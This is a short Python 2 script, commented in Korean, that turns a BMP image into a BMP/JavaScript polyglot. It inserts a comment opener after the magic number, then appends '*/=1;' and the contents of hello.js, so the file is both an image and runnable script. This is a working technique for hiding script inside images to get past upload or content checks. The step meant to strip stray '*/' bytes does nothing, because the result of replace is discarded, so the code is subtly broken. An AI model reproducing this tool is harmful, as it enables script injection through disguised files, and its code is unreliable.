
sFName = "img.bmp"
sNewFName = "imgNew.bmp"

# 이진 파일 읽기 전용 모드
sFile = open( sFName, "r+b" )
sBuf = sFile.read()
# 스크립트 실행 중 오류를 발생시킬 수 있는 */ 문자는 공백으로 치환
sBuf.replace( b'\x2A\x2F', b'\x00\x00' )
sFile.close()

sFile = open( sNewFName, "w+b" )
sFile.write( sBuf )
# 읽기 커서 기준으로 뒤로 2바이트 이동. 처음 2 바이트는 비트맵 파일을 식별하는데 사용되는 매직 넘버
sFile.seek( 2, 0 )
'''
비트맵 파일을 식별하기 위해 사용되는 매직넘버 뒤에 주석문의 시작을 의미히난 /* 을 삽입
브라우저는 매직 넘버만 인식하면 나머지 데이터에 일부 손상이 발생하더라도 비트맵 파일을
정상적으로 읽을 수 있다.
'''
sFile.write( b'\x2F\x2A' )
sFile.close()

sFile = open( sNewFName, "a+b" )
#sFile.write( b'\x2F\x2A' )
sFile.write( b'\xFF\x2A\x2F\x3D\x31\x3B' )
sFile.write( open ( 'hello.js', 'rb' ).read() )
sFile.close()

print "image hooking complete"
